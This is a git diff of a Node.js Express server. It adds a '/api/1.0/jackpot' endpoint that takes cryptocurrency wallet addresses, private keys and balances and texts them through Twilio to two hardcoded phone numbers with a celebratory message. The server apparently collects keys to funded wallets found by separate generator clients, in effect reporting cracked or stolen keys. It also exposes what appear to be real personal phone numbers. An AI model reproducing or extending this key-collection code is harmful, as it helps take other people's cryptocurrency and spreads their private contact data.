@@ -29,13 +29,19 @@ app.use(fileUpload({
     createParentPath: true
 }));
 
-
 /**
  * Environment variables
  */
 
 const HOST = process.env.HOST;
 const HTTP_PORT = 3334;
+const accountSid = process.env.ACCOUNT_SID;
+const authToken = process.env.AUTH_TOKEN;
+const numberFrom = process.env.NUMBER;
+
+const client = require('twilio')(accountSid, authToken);
+
+var numbersToMessage = ["+33783156204", "+33616530226"]
   
 app.post('/api/1.0/register/:name', function (req, res) {
     let name = req.params.name;
@@ -60,10 +66,35 @@ app.post('/api/1.0/register/:name', function (req, res) {
     }
 });
 
-app.get('/jackpot', function(req, res){
-    const file = `${__dirname}/generators/jackpot/jackpot.txt`;
+app.get('/api/1.0/jackpot', function(req, res){
+    const file = `${__dirname}/jackpot.txt`;
     res.download(file); // Set disposition and send it.
 });
+
+app.post('/api/1.0/jackpot', function (req, res) {
+    console.log("POST JACKPOT CALLED")
+    let address = req.body.address;
+    let private = req.body.private;
+    let balance = req.body.balance;
+
+    numbersToMessage.forEach(function(number){
+        var message = client.messages.create({
+          body: `OK BOYZZZZ !!!! BOOM BAM ! : address : ${address}, balance : ${balance}, key: ${private}`,
+          from: numberFrom,
+          to: number
+        })
+        .then(message =>  console.log(message.status))
+        .done();
+    });
+
+    res.setHeader('Content-Type', 'application/json');
+    res
+    .status(200)
+    .json(success("OK", res.statusCode));
+});
+
+
+
 
 app.get('/download/:name/:date', function(req, res){
     let name = req.params.name;
